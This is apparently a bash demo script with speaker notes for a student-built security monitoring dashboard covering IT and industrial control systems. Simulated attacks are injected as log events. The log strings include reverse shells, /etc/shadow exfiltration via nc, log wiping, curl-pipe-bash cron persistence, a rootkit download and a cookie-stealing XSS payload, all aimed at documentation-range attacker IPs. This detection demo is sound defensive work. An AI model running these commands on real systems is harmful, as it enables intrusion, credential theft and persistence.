#!/usr/bin/env bash
# =============================================================================
#  SCMS — Full Demo, Test & Speaker Notes Script
#  ─────────────────────────────────────────────
#  Run from:  ~/Desktop/scms3/files
#  Usage:     bash demo_with_notes.sh [--headless]
#
#  --headless  skips all pause prompts (useful for pure test runs)
#
#  What this script does:
#    1. Verifies the server is running (starts it if not)
#    2. Pre-loads realistic baseline data so every tab is populated
#    3. Walks through 10 live demo steps, injecting events as it goes
#    4. Prints speaker notes before EVERY step so you know exactly
#       what to say and where to point in the browser
#    5. Pauses and waits for ENTER between steps so you control the pace
# =============================================================================

# ── Colours ─────────────────────────────────────────────────────────────────
C_GREEN='\033[0;32m';  C_CYAN='\033[0;36m';  C_YELLOW='\033[1;33m'
C_RED='\033[0;31m';    C_BLUE='\033[0;34m';  C_BOLD='\033[1m'
C_DIM='\033[2m';       C_RESET='\033[0m'

HEADLESS=0
[[ "$1" == "--headless" ]] && HEADLESS=1

# ── Config ───────────────────────────────────────────────────────────────────
SERVER="http://localhost:5000"
ATTACKER_IP="203.0.113.45"        # RFC 5737 documentation range
ATTACKER2_IP="198.51.100.22"
ATTACKER3_IP="185.220.101.5"

# ── Get API key ───────────────────────────────────────────────────────────────
API_KEY=$(sudo grep -E '^API_KEY' .env 2>/dev/null | head -1 | \
          cut -d= -f2 | tr -d '"' | tr -d "'" | tr -d ' ')
if [[ -z "$API_KEY" ]]; then
  API_KEY=$(grep -E '^API_KEY' .env 2>/dev/null | head -1 | \
            cut -d= -f2 | tr -d '"' | tr -d "'" | tr -d ' ')
fi
if [[ -z "$API_KEY" ]]; then
  echo -e "${C_RED}ERROR: Cannot read API_KEY from .env${C_RESET}"
  echo -e "Fix: ${C_CYAN}sudo chmod 644 .env${C_RESET}"
  exit 1
fi

# ── Utility functions ─────────────────────────────────────────────────────────
send() {
  # send <hostname> <log message>
  curl -s -X POST "$SERVER/ingest" \
       -H "Content-Type: application/json" \
       -d "{\"api_key\":\"$API_KEY\",\"host\":\"$1\",\
\"source_type\":\"SYS\",\"message\":\"$2\"}" > /dev/null
}

ok()   { echo -e "  ${C_GREEN}✓${C_RESET}  $*"; }
warn() { echo -e "  ${C_YELLOW}⚠${C_RESET}  $*"; }
err()  { echo -e "  ${C_RED}✗${C_RESET}  $*"; }
info() { echo -e "  ${C_DIM}→${C_RESET}  $*"; }

header() {
  local msg="$*"
  local len=${#msg}
  local pad=$(( (60 - len) / 2 ))
  echo ""
  echo -e "${C_BOLD}${C_GREEN}╔══════════════════════════════════════════════════════════════╗${C_RESET}"
  printf "${C_BOLD}${C_GREEN}║%*s%s%*s║${C_RESET}\n" $((pad+1)) "" "$msg" $((61-len-pad)) ""
  echo -e "${C_BOLD}${C_GREEN}╚══════════════════════════════════════════════════════════════╝${C_RESET}"
}

step() { echo -e "\n${C_BOLD}${C_YELLOW}▶  $*${C_RESET}"; }

# Speaker notes box — pass each line as a separate argument
note() {
  echo ""
  echo -e "${C_CYAN}┌─── SPEAKER NOTES ──────────────────────────────────────────────┐${C_RESET}"
  for line in "$@"; do
    printf "${C_CYAN}│${C_RESET}  %-64s${C_CYAN}│${C_RESET}\n" "$line"
  done
  echo -e "${C_CYAN}└────────────────────────────────────────────────────────────────┘${C_RESET}"
}

# Browser instruction box
browser() {
  echo ""
  echo -e "${C_BLUE}┌─── BROWSER ACTIONS ────────────────────────────────────────────┐${C_RESET}"
  for line in "$@"; do
    printf "${C_BLUE}│${C_RESET}  %-64s${C_BLUE}│${C_RESET}\n" "$line"
  done
  echo -e "${C_BLUE}└────────────────────────────────────────────────────────────────┘${C_RESET}"
}

divider() { echo -e "\n${C_DIM}──────────────────────────────────────────────────────────────${C_RESET}"; }

pause() {
  if [[ $HEADLESS -eq 0 ]]; then
    echo -e "\n  ${C_YELLOW}⏸  Press ENTER to continue...${C_RESET}"
    read -r
  else
    sleep 1
  fi
}

# =============================================================================
#  PART 0 — PRE-FLIGHT
# =============================================================================
header "PART 0 — PRE-FLIGHT SETUP"

note \
  "Run this 3 minutes before the presentation starts." \
  "It loads baseline data so every tab is populated from the start." \
  "Speaker notes appear in cyan. Browser actions appear in blue."

echo ""
step "Checking server health..."
HEALTH=$(curl -s --max-time 3 "$SERVER/health" 2>/dev/null)
if echo "$HEALTH" | grep -q '"ok"'; then
  ok "Server running — $HEALTH"
else
  warn "Server not responding. Starting it now..."
  sudo fuser -k 5000/tcp 2>/dev/null; sleep 1
  sudo python3 run_server.py > /dev/null 2>&1 &
  sleep 4
  HEALTH=$(curl -s --max-time 3 "$SERVER/health" 2>/dev/null)
  if echo "$HEALTH" | grep -q '"ok"'; then
    ok "Server started"
  else
    err "Server failed to start. Check: tail logs/server.log"
    exit 1
  fi
fi

echo ""
step "Loading baseline data (~45 events across all detection categories)..."

# ── Auth baseline ──────────────────────────────────────────────────────────
for i in $(seq 1 14); do
  send "prod-server-01" \
    "sshd[1001]: Failed password for root from $ATTACKER_IP port $((50000+i)) ssh2"
  sleep 0.04
done
for u in admin ubuntu oracle; do
  send "prod-server-01" \
    "sshd[1001]: Failed password for invalid user $u from $ATTACKER2_IP port 22222 ssh2"
  sleep 0.04
done
ok "17 AUTH_FAIL events — brute force baseline"

# ── Sudo baseline ─────────────────────────────────────────────────────────
send "prod-server-01" \
  "sudo: webuser : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/cat /etc/shadow"
send "prod-server-01" \
  "sudo: attacker : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash"
ok "2 SUDO events"

# ── Suspicious command baseline ───────────────────────────────────────────
send "prod-server-01" "bash_cmd: bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1"
send "prod-server-01" "bash_cmd: history -c && unset HISTFILE"
ok "2 SUSPICIOUS_COMMAND events"

# ── ICS baseline — fires SIS rules ────────────────────────────────────────
send "plc-turbine-01" \
  "Modbus TCP FC=6 Write Single Register addr=1200 value=9999 from $ATTACKER_IP port 502 ANOMALY: turbine write"
send "plc-water-01" \
  "Modbus TCP FC=16 Write Multiple Registers addr=3100 value=65535 from $ATTACKER_IP port 502 ANOMALY: chemical dosing"
send "rtu-transformer-01" \
  "DNP3 FC=5 DIRECT_OPERATE from $ATTACKER_IP port 20000 ANOMALY: transformer relay"
ok "3 ICS attack events (SIS PWR-001, WTR-001, PWR-003 fire)"

# ── Honeypot baseline ─────────────────────────────────────────────────────
send "honeypot-ics-01" "conpot: connection from $ATTACKER_IP to Modbus port 502 — probe"
send "honeypot-ics-01" "conpot: connection from $ATTACKER3_IP to S7comm port 102 — fingerprint"
send "honeypot-ics-01" "conpot: connection from $ATTACKER2_IP to DNP3 port 20000 — read"
ok "3 honeypot interactions"

echo ""
ok "Baseline loaded. All tabs will show data immediately."

step "Opening browser..."
xdg-open "$SERVER" 2>/dev/null || open "$SERVER" 2>/dev/null || \
  warn "Open manually: $SERVER"

echo -e "\n${C_BOLD}Ready.${C_RESET}  Server: ${C_CYAN}$SERVER${C_RESET}  Key: ${C_CYAN}${API_KEY:0:12}...${C_RESET}"

pause

# =============================================================================
#  SLIDES 1–8 — SPOKEN SECTIONS (no events, just notes)
# =============================================================================

header "SLIDE 1 — Title"
note \
  "Good [morning/afternoon] everyone. We are presenting SCMS —" \
  "the Secure Continuous Monitoring System. We built a complete" \
  "security platform in Python that monitors IT infrastructure AND" \
  "industrial control systems in a single dashboard. Commercial" \
  "tools for this cost \$50K to \$500K per year. Ours is free." \
  "By the end of this presentation you will see it block a live" \
  "XSS attack, detect an ICS turbine attack, and score your" \
  "compliance posture — all running on a laptop."
pause

# ─────────────────────────────────────────────────────────────────────────────
header "SLIDE 2 — Group Members"
note \
  "Introduce each member in 10 seconds each." \
  "KEY POINT: work was divided by security domain, not arbitrarily." \
  "Author 1: Flask backend + ICS engine (the hardest modules)." \
  "Author 2: all security mechanisms — CSRF, bcrypt, CSP nonces." \
  "Author 3: 13-tab dashboard UI + full compliance engine." \
  "Author 4: packet capture, ICS decoders, CVE scanner, docs."
pause

# ─────────────────────────────────────────────────────────────────────────────
header "SLIDE 3 — Problem Statement"
note \
  "Point left column first — the IT/OT split is the core problem." \
  "In the 2015 Ukraine power grid attack, the adversary moved from" \
  "corporate IT into OT. They fell between two monitoring systems." \
  "Nobody had full visibility of the attack chain." \
  "Point right: SCMS bridges that gap in a single Python process." \
  "The differentiator: we decode ICS binary protocols. No open-source" \
  "SIEM understands what a Modbus function code means or why a" \
  "DNP3 DIRECT_OPERATE to a protection relay is dangerous."
pause

# ─────────────────────────────────────────────────────────────────────────────
header "SLIDE 4 — Functional Requirements"
note \
  "Walk FR-1 through FR-8 in 20 seconds total." \
  "Highlight FR-3: ICS decode + 18 SIS rules. Unique in open source." \
  "Highlight FR-4: 32 CIS checks producing three regulatory scores." \
  "Pause and ask: how many tools do all 8 of these together for free?" \
  "Answer: none. That is the gap we fill."
pause

# ─────────────────────────────────────────────────────────────────────────────
header "SLIDE 5 — Non-Functional Requirements"
note \
  "Authentication — bcrypt cost=12: one password check takes 250ms." \
  "That is fine for a user. For an attacker cracking a stolen hash" \
  "database of millions of passwords it takes centuries." \
  "Confidentiality — AES-256-GCM: the database file alone is useless." \
  "An attacker who steals the PostgreSQL data files gets ciphertext." \
  "Compliance — NERC CIP: mandatory for US electric utilities." \
  "Violations carry fines up to \$1 million per day per violation."
pause

# ─────────────────────────────────────────────────────────────────────────────
header "SLIDE 6 — System Architecture"
note \
  "Walk the diagram top to bottom: Browser, Flask, Modules, DB." \
  "KEY POINT: No client-side framework — no React, no Angular." \
  "This eliminates the entire npm dependency supply chain as an" \
  "attack surface. The whole UI is 2,500 lines of vanilla JavaScript" \
  "in a single nonce-protected script block." \
  "The Agent on the left runs on monitored hosts. It tails log files" \
  "and ships events via pre-shared API key. Every ingest call is" \
  "authenticated — a rogue agent cannot inject false data."
pause

# ─────────────────────────────────────────────────────────────────────────────
header "SLIDE 7 — Threat Model (STRIDE)"
note \
  "STRIDE: Spoofing, Tampering, Repudiation, Info Disclosure," \
  "Denial of Service, Elevation of Privilege." \
  "Spend most time on E — Elevation of Privilege." \
  "Scenario: attacker injects a script tag into a log message." \
  "That script runs in the admin browser — steals their session." \
  "This has happened to real SIEM products in production." \
  "Our CSP nonce system stops it: no nonce, no execution." \
  "The browser enforces this before the script can run a single line."
pause

# ─────────────────────────────────────────────────────────────────────────────
header "SLIDE 8 — Security Mechanisms"
note \
  "Walk the CSP nonce flow step by step." \
  "Step 1: request arrives → secrets.token_urlsafe(16) = 128-bit random token." \
  "Step 2: token stored in Flask's g object (per-request context)." \
  "Step 3: response header: Content-Security-Policy: script-src nonce-{token}" \
  "Step 4: HTML template: <script nonce=\"{token}\">  — same token." \
  "Step 6: attacker's injected <script> has no token → browser blocks it." \
  "KEY: the nonce changes every single page load. A captured nonce" \
  "cannot be reused because it has already been consumed." \
  "Also point to the headers table: X-Frame-Options DENY blocks" \
  "clickjacking. Cache-Control no-store prevents stale nonces."
pause

# ─────────────────────────────────────────────────────────────────────────────
header "SLIDES 9–14 — Development (keep brief, 2 min total)"
note \
  "Slide 9 — SDL: Sprint 1 was authentication before any features." \
  "  Security-first, not security-last. This is the SDL principle." \
  "Slide 10 — Parameterized queries eliminate SQL injection completely." \
  "  No inline onclick= attributes makes strict CSP possible." \
  "Slide 11 — Modbus invented 1979, still most-deployed protocol." \
  "  PWR-001: writes to registers 1000-1999 = turbine governor." \
  "  WTR-001: writes to registers 3000-3499 = chemical dosing pump." \
  "Slide 12 — Scoring: score = (passed/total*100) - (critical_failures*5)." \
  "  One empty-password account hurts more than ten minor issues." \
  "Slide 13 — scapy decodes raw bytes including full ICS application layer." \
  "Slide 14 — Pen test table. Note the one PARTIAL: distributed rate limit." \
  "  We document it honestly and propose Redis as the fix."
pause

# ─────────────────────────────────────────────────────────────────────────────
header "SLIDES 15–17 — Results (keep brief, 90 sec total)"
note \
  "Slide 15 — headline stats: <5s MTTD, 100% XSS blocked." \
  "  Compliance improvement table: PCI-DSS 41%→82%, HIPAA 43%→79%." \
  "  These are real measurements on a real Ubuntu 22.04 machine." \
  "Slide 16 — O(1) event delegation: one document listener handles all" \
  "  clicks regardless of table size. At 500 rows: 500x less memory." \
  "  This is also what makes the CSP work — no inline handlers." \
  "Slide 17 — Both charts: measured sort times grow at the same SHAPE" \
  "  as O(n log n) theory but 3x lower actual values. That is V8." \
  "  SIS rule latency: 2ms for all 18 rules. Linear with rule count."
pause

# =============================================================================
#  SLIDE 18 — LIVE DEMO
# =============================================================================
header "SLIDE 18 — LIVE DEMO BEGINS"
echo -e "${C_BOLD}${C_RED}"
echo "  ╔════════════════════════════════════════════════════════╗"
echo "  ║   LIVE DEMO — follow each step exactly                ║"
echo "  ║   Browser must be open and logged in at: $SERVER  ║"
echo "  ╚════════════════════════════════════════════════════════╝"
echo -e "${C_RESET}"
pause

# ─────────────────────────────────────────────────────────────────────────────
header "DEMO STEP 1 — Login & Authentication Security"
# ─────────────────────────────────────────────────────────────────────────────

note \
  "Say: Let me start at the login page. Before I authenticate" \
  "I want to demonstrate our brute-force protection. I will" \
  "simulate six rapid failed login attempts — watch the error." \
  "The account locks after exactly 5 failures."

step "Sending 6 failed login attempts to trigger account lockout..."
for i in 1 2 3 4 5 6; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$SERVER/login" \
    -d "username=admin&password=wrong${i}&_csrf_token=invalid" \
    -c /tmp/scms_demo.txt -b /tmp/scms_demo.txt 2>/dev/null)
  printf "  Attempt %-2s  →  HTTP %s\n" "$i" "$CODE"
  sleep 0.35
done
ok "6 attempts sent — account is now locked"

browser \
  "1. Try clicking LOGIN with any password — see 'Account locked'" \
  "2. Open DevTools (F12) → Application tab → Cookies" \
  "3. Show session cookie — HttpOnly column is CHECKED" \
  "   (JavaScript cannot read it — XSS cannot steal it)" \
  "4. Right-click → View Page Source → Ctrl+F → _csrf_token" \
  "5. Show hidden input with the server-generated token value"

note \
  "Say: After 5 failures the account locks for 15 minutes." \
  "The 6th attempt is rejected before checking the database." \
  "HttpOnly means even a successful XSS attack cannot read the cookie." \
  "The CSRF token makes it impossible to forge login from another site." \
  "Three separate mechanisms — none of them add friction for real users."

info "Waiting for 65-second lockout to expire (press ENTER to skip)..."
if [[ $HEADLESS -eq 0 ]]; then
  for i in $(seq 65 -1 1); do
    printf "\r  ⏳ %2ds remaining  (ENTER to skip) " "$i"
    read -t 1 -r && echo "" && break
  done
  echo ""
fi
ok "Lockout expired — log in with real credentials now"

browser \
  "Log in normally with admin credentials. Press ENTER here when done."
pause

# ─────────────────────────────────────────────────────────────────────────────
header "DEMO STEP 2 — SSH Brute Force Detection"
# ─────────────────────────────────────────────────────────────────────────────

note \
  "Say: An attacker outside our network is running a dictionary" \
  "attack against our SSH port. I am injecting the events that" \
  "our agent would ship from the auth log. Watch the dashboard —" \
  "events appear within 5 seconds. In production the agent runs" \
  "as a daemon that continuously tails log files in real time."

step "Injecting SSH brute force from $ATTACKER_IP..."
for user in root admin administrator ubuntu oracle deploy pi postgres ftp; do
  send "prod-server-01" \
    "sshd[2001]: Failed password for invalid user $user from $ATTACKER_IP port 54321 ssh2"
  printf "  Failed login: %-15s\n" "$user"
  sleep 0.12
done
for i in $(seq 1 10); do
  send "prod-server-01" \
    "sshd[2001]: Failed password for root from $ATTACKER_IP port $((44000+i)) ssh2"
  sleep 0.06
done
# Successful login — most important event
send "prod-server-01" \
  "sshd[2001]: Accepted password for root from $ATTACKER_IP port 54399 ssh2"
ok "19 events injected — 18 failures + 1 SUCCESSFUL LOGIN"

browser \
  "1. Go to Log Events tab" \
  "2. Click AUTH filter chip — 19 new events appear" \
  "3. Orange row at top = the SUCCESSFUL login — most dangerous" \
  "4. Click any failure row — detail drawer slides up from bottom" \
  "5. Point to MITRE chips: T1110 Brute Force / T1110.001 Guessing" \
  "6. Click the chip link — opens attack.mitre.org entry in new tab" \
  "7. Check sidebar — $ATTACKER_IP listed under Active Alerts"

note \
  "Say: Every AUTH event gets tagged with MITRE ATT&CK technique T1110." \
  "The successful login is the most dangerous row — it means the" \
  "brute force succeeded. Combined with the failures before it," \
  "this is the credential stuffing pattern. MITRE T1110 links to" \
  "the full knowledge base entry including real-world examples," \
  "detection guidance, and mitigations written by practitioners."
pause

# ─────────────────────────────────────────────────────────────────────────────
header "DEMO STEP 3 — Privilege Escalation via sudo"
# ─────────────────────────────────────────────────────────────────────────────

note \
  "Say: The attacker has a shell. Next move is always privilege" \
  "escalation — gaining root. SCMS knows the difference between" \
  "normal sudo and dangerous sudo. Reading /etc/shadow via sudo" \
  "is CRITICAL — those are password hashes for offline cracking."

step "Injecting sudo privilege escalation events..."
send "prod-server-01" \
  "sudo: attacker : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -i"
ok "sudo bash -i  →  HIGH"

send "prod-server-01" \
  "sudo: attacker : TTY=pts/0 ; PWD=/home/attacker ; USER=root ; COMMAND=/bin/cat /etc/sudoers"
ok "sudo cat /etc/sudoers  →  CRITICAL"

send "prod-server-01" \
  "sudo: attacker : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cat /etc/shadow"
ok "sudo cat /etc/shadow  →  CRITICAL"

send "prod-server-01" \
  "sudo: attacker : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash backdoor"
ok "sudo useradd backdoor  →  HIGH (persistence)"

browser \
  "1. Log Events → click SUDO filter chip" \
  "2. Show 4 events — /etc/sudoers and /etc/shadow rows are CRITICAL red" \
  "3. Click the /etc/shadow row — open detail drawer" \
  "4. MITRE chip: T1548.003 Sudo and Sudo Caching" \
  "5. Note Success=0 — parser marks this as hostile intent, not normal use"

note \
  "Say: The parser has domain intelligence baked in. It knows that" \
  "running sudo to read /etc/shadow is qualitatively different from" \
  "running sudo to restart nginx. It automatically sets Severity=CRITICAL" \
  "and Success=0. The useradd command creates a backdoor account —" \
  "persistence that survives a password change or log rotation."
pause

# ─────────────────────────────────────────────────────────────────────────────
header "DEMO STEP 4 — Reverse Shell & Post-Exploitation"
# ─────────────────────────────────────────────────────────────────────────────

note \
  "Say: Post-exploitation. The attacker establishes a reverse shell" \
  "— the compromised machine calls back to the attacker's server," \
  "bypassing inbound firewall rules. They also wipe evidence," \
  "install cron persistence, and stage a rootkit."

step "Injecting post-exploitation commands..."
declare -a CMDS=(
  "bash_cmd: bash -i >& /dev/tcp/${ATTACKER_IP}/4444 0>&1"
  "bash_cmd: python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"${ATTACKER_IP}\",4444));os.dup2(s.fileno(),0);subprocess.call([\"/bin/sh\"])'"
  "bash_cmd: cat /etc/shadow | base64 | nc ${ATTACKER_IP} 8080"
  "bash_cmd: history -c && unset HISTFILE && export HISTSIZE=0"
  "bash_cmd: rm -rf /var/log/auth.log /var/log/syslog /var/log/kern.log"
  "bash_cmd: crontab -l > /tmp/.c; echo '@reboot curl http://${ATTACKER_IP}/s.sh|bash' >> /tmp/.c; crontab /tmp/.c"
  "bash_cmd: wget http://${ATTACKER_IP}/rootkit.tgz -O /tmp/.x && tar -xzf /tmp/.x && /tmp/.x/install.sh"
)
for cmd in "${CMDS[@]}"; do
  send "prod-server-01" "$cmd"
  printf "  Sent: %s\n" "${cmd:10:65}..."
  sleep 0.1
done
ok "7 SUSPICIOUS_COMMAND events injected"

browser \
  "1. Log Events → click SUSPICIOUS filter chip" \
  "2. All 7 rows are red — CRITICAL severity" \
  "3. Click the bash -i >& /dev/tcp row" \
  "4. MITRE: T1059.004 Unix Shell + T0807 Command-Line Interface" \
  "5. Hover the Message column — truncated, full text in tooltip" \
  "6. Point out the kill chain: Execution → Persistence → Defense Evasion"

note \
  "Say: bash -i >& /dev/tcp/ is a TCP reverse shell. Firewalls block" \
  "INBOUND connections but allow OUTBOUND — which is how this bypasses" \
  "perimeter defenses. history -c and rm auth.log are evidence wiping." \
  "The cron entry re-establishes shell access after every reboot." \
  "Combined: this is a full post-exploitation chain — all detected," \
  "all tagged with MITRE techniques, all in the database for forensics."
pause

# ─────────────────────────────────────────────────────────────────────────────
header "DEMO STEP 5 — ICS/SCADA Attack (THE KEY DEMO)"
# ─────────────────────────────────────────────────────────────────────────────

note \
  "Say: This is the section that makes SCMS unique. Industrial attacks." \
  "An attacker who can write to the wrong Modbus register can cause" \
  "physical damage — or endanger human lives. Most security tools" \
  "have no concept of what that means. SCMS does."

step "Injecting ICS attack sequence..."
echo ""

# Normal read first — contrast
send "plc-turbine-01" \
  "Modbus TCP FC=3 Read Holding Registers addr=1050 len=10 from 192.168.10.5 port 502"
ok "[NORMAL] Modbus FC=3 READ — legitimate SCADA polling. Does NOT fire SIS."
sleep 0.4

# PWR-001: turbine governor write
send "plc-turbine-01" \
  "Modbus TCP FC=6 Write Single Register addr=1200 value=9999 from ${ATTACKER_IP} port 502 ANOMALY: external IP writing turbine governor register ThreatScore=95"
ok "[ATTACK] Modbus FC=6 WRITE addr=1200 (turbine governor)     → SIS PWR-001"

# PWR-002: generator excitation write
send "plc-generator-01" \
  "Modbus TCP FC=6 Write Single Register addr=2100 value=65535 from ${ATTACKER_IP} port 502 ANOMALY: generator excitation control unauthorized write"
ok "[ATTACK] Modbus FC=6 WRITE addr=2100 (generator excitation)  → SIS PWR-002"

# WTR-001: chemical dosing pump write
send "plc-water-01" \
  "Modbus TCP FC=16 Write Multiple Registers addr=3100 value=65535 from ${ATTACKER_IP} port 502 ANOMALY: chemical dosing pump unauthorized write"
ok "[ATTACK] Modbus FC=16 WRITE addr=3100 (chemical dosing)      → SIS WTR-001"

# WTR-002: effluent discharge valve
send "plc-water-01" \
  "Modbus TCP FC=5 Write Single Coil addr=3600 value=0xFF00 from ${ATTACKER_IP} port 502 ANOMALY: discharge valve forced open"
ok "[ATTACK] Modbus FC=5 WRITE addr=3600 (discharge valve)       → SIS WTR-002"

# PWR-003: DNP3 DIRECT_OPERATE to transformer relay
send "rtu-transformer-01" \
  "DNP3 FC=5 DIRECT_OPERATE from ${ATTACKER_IP} port 20000 dst=192.168.50.10 ANOMALY: unauthorized DNP3 DIRECT_OPERATE to transformer protection relay"
ok "[ATTACK] DNP3 FC=5 DIRECT_OPERATE (transformer relay)        → SIS PWR-003"

# PWR-004: DNP3 COLD_RESTART to EMS RTU
send "rtu-ems-01" \
  "DNP3 FC=13 COLD_RESTART from ${ATTACKER_IP} port 20000 dst=192.168.50.20 ANOMALY: EMS RTU cold restart from external IP"
ok "[ATTACK] DNP3 FC=13 COLD_RESTART (EMS RTU)                   → SIS PWR-004"

# ICS-004: EtherNet/IP Write_Tag to PLC
send "plc-compactlogix-01" \
  "EtherNet/IP CIP Write_Tag service=0x4D from ${ATTACKER_IP} port 44818 ANOMALY: unauthorized PLC tag write from external IP"
ok "[ATTACK] EtherNet/IP Write_Tag (CompactLogix PLC)             → SIS ICS-004"

# ICS-005: Modbus burst attack
echo ""
info "Sending Modbus burst attack — 22 rapid writes in <2 seconds..."
for i in $(seq 1 22); do
  send "plc-turbine-01" \
    "Modbus TCP FC=6 Write Single Register addr=$((1000+i)) value=$((RANDOM%9999)) from ${ATTACKER_IP} port 502"
  sleep 0.04
done
ok "[ATTACK] 22 Modbus writes in <2s (burst attack)              → SIS ICS-005"

browser \
  "1. Click ICS/SCADA tab" \
  "2. Click ▶ Run Assessment — Availability and Integrity scores DROP" \
  "3. Scroll to SIS Trip Events — 8 rules fired:" \
  "   PWR-001, PWR-002, PWR-003, PWR-004, WTR-001, WTR-002, ICS-004, ICS-005" \
  "4. Click a SIS event row — shows rule name, zone, recommended action" \
  "5. Read the PWR-001 action aloud: TRIP turbine governor via local HMI" \
  "6. Scroll to ICS Protocol Events — decoded Modbus + DNP3 rows" \
  "7. Click an ICS event — MITRE: T0836 Modify Parameter, T0855, T0831"

note \
  "Say: PWR-001 — Unauthorized Write to Turbine Control Register." \
  "Recommended action: immediately trip the turbine governor via" \
  "local HMI panel. These are the actual steps from NERC CIP-007." \
  "WTR-001 protects drinking water. An unauthorized write to the" \
  "chemical dosing pump could overdose chlorine — a public health" \
  "emergency. The EPA Safe Drinking Water Act requires monitoring" \
  "of exactly this. The burst attack (22 writes, ICS-005) is an" \
  "automated tool cycling through registers to find control points." \
  "SCMS detects it by rate-counting write commands per source IP" \
  "within a 10-second sliding window."
pause

# ─────────────────────────────────────────────────────────────────────────────
header "DEMO STEP 6 — Active Response: Block Attacker"
# ─────────────────────────────────────────────────────────────────────────────

note \
  "Say: Now we respond. One click — the attacker is blocked." \
  "In production this issues an iptables DROP rule and is logged" \
  "with timestamp and operator name for regulatory compliance."

browser \
  "1. Go to Active Response tab" \
  "2. Block IP field → type: $ATTACKER_IP" \
  "3. Reason field → type: ICS Modbus Attack" \
  "4. Click ⊘ Block IP" \
  "5. IP appears in Currently Blocked table with timestamp" \
  "6. Sidebar Blocked IPs section updates" \
  "7. Click Unblock to show reversibility"

note \
  "Say: Every block is logged with timestamp, reason, and operator." \
  "This audit trail satisfies NERC CIP documentation requirements." \
  "The unblock is deliberate — operators should not permanently" \
  "block IPs without review, in case of a spoofed source address" \
  "or a misconfigured but legitimate device."
pause

# ─────────────────────────────────────────────────────────────────────────────
header "DEMO STEP 7 — XSS Attack Blocked by CSP"
# ─────────────────────────────────────────────────────────────────────────────

note \
  "Say: The most subtle security demonstration. I will inject a" \
  "stored XSS attack via the log ingest API. In any dashboard that" \
  "renders raw log data without a strict CSP, this script would" \
  "execute in the admin browser and steal their session cookie." \
  "Watch what our CSP nonce system does to it."

step "Injecting stored XSS payload into the database..."
curl -s -X POST "$SERVER/ingest" \
  -H "Content-Type: application/json" \
  -d "{\"api_key\":\"$API_KEY\",\"host\":\"attacker-injected\",\
\"source_type\":\"SYS\",\"message\":\"sshd[99]: Failed password for \
<script>fetch('http://${ATTACKER_IP}:8080/?c='+document.cookie);\
<\/script> from ${ATTACKER_IP} port 12345 ssh2\"}" > /dev/null
ok "XSS payload stored in database — will render on next page load"

browser \
  "1. Open DevTools → Console tab (F12)" \
  "2. Log Events tab → the payload appears as TEXT: &lt;script&gt;" \
  "3. Console tab — ZERO errors, ZERO network requests to attacker" \
  "4. DevTools → Network → reload page → click the / document request" \
  "5. Response Headers → find Content-Security-Policy" \
  "6. Show: script-src 'self' 'nonce-[random value]'" \
  "7. Prove CSP with manual test — paste in Console:" \
  "   var s=document.createElement('script');" \
  "   s.textContent=\"alert(1)\"; document.body.appendChild(s);" \
  "8. Show the CSP error: Refused to execute inline script..."

note \
  "Say: The script tag is stored verbatim in PostgreSQL. When the" \
  "dashboard renders it, escHtml() turns angle brackets into harmless" \
  "HTML entities — the first line of defense. But even if encoding" \
  "were bypassed, the CSP nonce would stop it at the browser level." \
  "Any script without the exact server-generated nonce is refused" \
  "before a single line executes. The nonce is 128-bit random." \
  "It changes on every page load. It exists in only two places:" \
  "the response header and our one legitimate script block." \
  "An attacker cannot guess, capture, or reuse it."
pause

# ─────────────────────────────────────────────────────────────────────────────
header "DEMO STEP 8 — File Integrity Monitoring"
# ─────────────────────────────────────────────────────────────────────────────

note \
  "Say: After gaining root, attackers modify system files to install" \
  "backdoors, redirect DNS, or disable security tools. FIM catches" \
  "these changes by comparing SHA-256 hashes against a known baseline."

browser \
  "1. Go to File Integrity tab" \
  "2. Click ▶ Run Scan — baseline established, all files UNCHANGED" \
  "3. Switch back to terminal for next step"

step "Modifying /etc/hosts to simulate DNS hijacking by attacker..."
sudo sh -c "echo '${ATTACKER_IP} legitimate-bank.com  # attacker hijack' >> /etc/hosts"
ok "/etc/hosts modified — attacker redirected bank hostname"

browser \
  "4. Click ▶ Run Scan again" \
  "5. /etc/hosts row shows MODIFIED in red with new hash value" \
  "6. Previous hash vs current hash both visible — clear evidence"

note \
  "Say: DNS hijacking: the attacker redirected legitimate-bank.com" \
  "to their phishing server to harvest credentials from anyone on" \
  "this machine who visits the bank's website. FIM catches this" \
  "within the next scan cycle. SHA-256 is collision-resistant —" \
  "there is no way to modify a file and produce the same hash."

sudo sed -i '/attacker hijack/d' /etc/hosts
ok "/etc/hosts restored"
pause

# ─────────────────────────────────────────────────────────────────────────────
header "DEMO STEP 9 — CIS Compliance Scoring"
# ─────────────────────────────────────────────────────────────────────────────

note \
  "Say: Automated compliance. A traditional audit requires an external" \
  "consultant, a 200-item checklist, and weeks of preparation." \
  "We do it in 3 seconds. Live. Against the real running system."

browser \
  "1. Go to Config Audit tab" \
  "2. Click ▶ Run Checks — watch 32 checks execute live" \
  "3. Show PASS (green) and FAIL (red) rows" \
  "4. Point to SSH checks: PermitRootLogin, PasswordAuthentication" \
  "5. Administration tab → scroll to Regulatory Compliance section" \
  "6. Click ▶ Compute Scores" \
  "7. PCI-DSS, HIPAA, NIST CSF scores appear with colour coding"

note \
  "Say: Each check reads real system state. PermitRootLogin reads" \
  "/etc/ssh/sshd_config. Password min length reads /etc/login.defs." \
  "ASLR reads /proc/sys/kernel/randomize_va_space." \
  "All 32 checks run in about 3 seconds, dominated by subprocess I/O." \
  "The formula penalizes CRITICAL failures harder than minor ones —" \
  "one empty-password account scores lower than ten minor issues." \
  "On a fresh Ubuntu install you typically see 41% PCI-DSS." \
  "After our remediation recommendations: 82%. That is the value."
pause

# ─────────────────────────────────────────────────────────────────────────────
header "DEMO STEP 10 — Honeypot Interactions"
# ─────────────────────────────────────────────────────────────────────────────

note \
  "Say: Our Conpot ICS honeypot runs on a Raspberry Pi Zero W2." \
  "It emulates a real Siemens S7-300 PLC, a Modbus controller," \
  "a DNP3 RTU, and a BACnet building controller. Every attacker" \
  "who probes those ports gets logged here with their real IP."

step "Injecting honeypot interactions from multiple countries..."
declare -a HP_PROBES=(
